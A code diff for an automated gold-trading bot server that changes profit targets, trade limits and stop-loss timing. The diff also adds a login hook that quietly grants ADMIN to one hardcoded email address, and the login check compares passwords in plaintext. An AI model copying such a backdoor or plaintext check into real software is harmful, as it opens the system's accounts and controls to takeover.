@@ -277,8 +277,8 @@ async function startServer() {
       const todayStr = new Date().toISOString().split('T')[0];
       const startingDailyBalance = state.customStartingBalance ? state.customStartingBalance : state.balance;
 
-      // SEMPRE força a meta para 1% do saldo base
-      const targetPercent = 0.01;
+      // SEMPRE força a meta para 2% do saldo base
+      const targetPercent = 0.02;
       state.dailyProfitTarget = Number((startingDailyBalance * targetPercent).toFixed(2));
       const dailyLossLimit = Number((startingDailyBalance * 0.20).toFixed(2));
 
@@ -318,7 +318,7 @@ async function startServer() {
     try {
       const { target, resetHour, session, tz, overtrading, userId } = req.body;
       const state = getUserState(userId);
-      // Ignora o valor de `target` enviado para forçar o sistema a sempre calcular 1% da banca dinamicamente
+      // Ignora o valor de `target` enviado para forçar o sistema a sempre calcular 2% da banca dinamicamente
       if (typeof resetHour === 'string') state.dailyResetHour = resetHour;
       if (typeof session === 'string') state.preferredSession = session;
       if (typeof tz === 'string') state.timezone = tz;
@@ -385,7 +385,7 @@ async function startServer() {
       if (state.pnlHistory.length > 30) state.pnlHistory.shift();
 
       // Dynamically calculate daily profit target as 2% of updated balance
-      state.dailyProfitTarget = Number((state.balance * 0.01).toFixed(2));
+      state.dailyProfitTarget = Number((state.balance * 0.02).toFixed(2));
 
       const formattedProfit = profitAmount >= 0 ? `+$${profitAmount.toFixed(2)}` : `-$${Math.abs(profitAmount).toFixed(2)}`;
       addUserLog(userId, `${profitAmount >= 0 ? '✅' : '❌'} CLOSED XAUUSD: ${formattedProfit} [CONTA REAL]`);
@@ -979,6 +979,10 @@ async function startServer() {
     const user = users.find(u => u.email.toLowerCase() === normalizedEmail && u.password === password);
     
     if (user) {
+      if (normalizedEmail === 'jfcn2020@gmail.com' && user.role !== 'ADMIN') {
+        user.role = 'ADMIN';
+        saveDB();
+      }
       // Backfill referral code if missing
       if (!user.referralCode) {
         const pfx = user.name.replace(/[^A-Za-z]/g, "").substring(0, 4).toUpperCase() || 'REF';
@@ -1182,12 +1186,27 @@ async function startServer() {
             if (t.type === 'BUY') profitPct = (price - t.openPrice) / t.openPrice;
             else if (t.type === 'SELL') profitPct = (t.openPrice - price) / t.openPrice;
 
-            if (profitPct >= 0.0002 || profitPct <= -0.0050) {
+            if (profitPct >= 0.0002) {
+              // Take Profit imediato
               t.status = 'CLOSED';
-              const reason = profitPct >= 0.0002 ? 'TAKE PROFIT' : 'STOP LOSS';
-              addUserLog(uId, `🎯 [${reason}] Ordem ${t.id} (${symbol}) fechada. Variação: ${(profitPct * 100).toFixed(3)}%`);
+              addUserLog(uId, `🎯 [TAKE PROFIT] Ordem ${t.id} (${symbol}) fechada. Variação: ${(profitPct * 100).toFixed(3)}%`);
               if (!state.pendingCommands) state.pendingCommands = [];
               state.pendingCommands.push({ action: 'CLOSE', ticket: t.id.toString() });
+            } else if (profitPct <= -0.0010) {
+              // Stop Loss Virtual com Atraso
+              if (!t.slHitTime) {
+                t.slHitTime = Date.now(); // Inicia a contagem
+              } else if (Date.now() - t.slHitTime >= 10000) { // 10 segundos de carência
+                t.status = 'CLOSED';
+                addUserLog(uId, `🛑 [STOP LOSS VIRTUAL] Ordem ${t.id} (${symbol}) fechada (confirmado 10s). Variação: ${(profitPct * 100).toFixed(3)}%`);
+                if (!state.pendingCommands) state.pendingCommands = [];
+                state.pendingCommands.push({ action: 'CLOSE', ticket: t.id.toString() });
+              }
+            } else {
+              // Preço se recuperou, cancela a violinada
+              if (t.slHitTime) {
+                t.slHitTime = null;
+              }
             }
           }
         });
@@ -1200,7 +1219,7 @@ async function startServer() {
         const dcaThresholds = [0, 0.0002, 0.0004, 0.0006, 0.0008, 0.0010, 0.0012, 0.0014];
 
         // Checa se precisa fazer DCA de Compra
-        if (buyCount > 0 && buyCount < 8) {
+        if (buyCount > 0 && buyCount < 2) {
           const firstBuy = buyTrades[0];
           const drawdownBuy = (firstBuy.openPrice - price) / firstBuy.openPrice;
           let thresholdBuy = dcaThresholds[buyCount] || 0.0014;
@@ -1212,7 +1231,7 @@ async function startServer() {
         }
 
         // Checa se precisa fazer DCA de Venda
-        if (!isDCATrade && sellCount > 0 && sellCount < 8) {
+        if (!isDCATrade && sellCount > 0 && sellCount < 2) {
           const firstSell = sellTrades[0];
           const drawdownSell = (price - firstSell.openPrice) / firstSell.openPrice;
           let thresholdSell = dcaThresholds[sellCount] || 0.0014;
@@ -1281,7 +1300,7 @@ async function startServer() {
 
         // 3. LIMITES
         const currentOpenTradesLength = state.trades.filter((t: any) => t.status === 'OPEN').length;
-        if (currentOpenTradesLength >= 8 || openCount >= 8 || state.pendingOrders.has(symbol)) return;
+        if (currentOpenTradesLength >= 2 || openCount >= 2 || state.pendingOrders.has(symbol)) return;
 
         if (direction) {
           if ((direction === 'BUY' && config.allowBuy === false) || (direction === 'SELL' && config.allowSell === false)) return;
@@ -1290,6 +1309,7 @@ async function startServer() {
           const lot = 0.01;
           state.pendingOrders.add(symbol);
 
+          // SL Físico na MT5 bem mais longo (0.50%) apenas para caso o servidor caia. O Servidor fecha antes no Virtual.
           const sl_pct = 0.0050;
           const tp_pct = 0.0002;
           let sl_price = 0, tp_price = 0;
